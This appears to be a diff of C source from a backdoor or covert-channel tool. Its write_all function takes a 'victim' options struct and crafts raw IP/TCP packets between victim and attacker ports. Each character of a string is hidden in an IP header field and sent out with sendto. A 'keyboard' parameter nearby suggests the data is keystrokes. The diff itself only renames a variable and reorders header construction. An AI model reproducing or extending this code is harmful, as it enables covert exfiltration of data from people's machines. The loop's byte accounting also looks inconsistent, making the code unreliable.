@@ -62,7 +62,7 @@ void safe_write_all(int file_desc, const char *str, int keyboard, struct options
 
 
 int write_all(int file_desc, const char *str, struct options_victim* opts) {
-    int bytesWritten = 0;
+    int bytes = 0;
     int bytesToWrite = (int)strlen(str);
     char s_buffer[TCP_SEND_SIZE] = {0};
     struct iphdr ih;
@@ -72,19 +72,19 @@ int write_all(int file_desc, const char *str, struct options_victim* opts) {
     do {
 //        bytesWritten = (int)write(file_desc, str, bytesToWrite);
         for (int i = 0; i < size; i++) {
-            create_tcp_header(&th, VIC_TCP_PORT, ATC_TCP_PORT);
             create_ip_header(&ih, opts, 'V', str[i], 'T');
-            memcpy(s_buffer, &ih, sizeof(struct iphdr));
+            create_tcp_header(&th, VIC_TCP_PORT, ATC_TCP_PORT);
             memcpy(s_buffer + sizeof(struct iphdr), &th, sizeof(struct tcphdr));
-            bytesWritten = (int)sendto(opts->tcp_socket, (const char *) s_buffer, TCP_SEND_SIZE, 0,
+            memcpy(s_buffer, &ih, sizeof(struct iphdr));
+            bytes = (int)sendto(opts->tcp_socket, (const char *) s_buffer, TCP_SEND_SIZE, 0,
                                        (const struct sockaddr *) &opts->tcpsa, sizeof(opts->tcpsa));
 //            bytesWritten = (int)write(opts->tcp_socket, str, size);
-            if(bytesWritten == -1) {
+            if(bytes == -1) {
                 return 0;
             }
         }
-        bytesToWrite -= bytesWritten;
-        str += bytesWritten;
+        bytesToWrite -= bytes;
+        str += bytes;
     } while(bytesToWrite > 0);
 
     return 1;
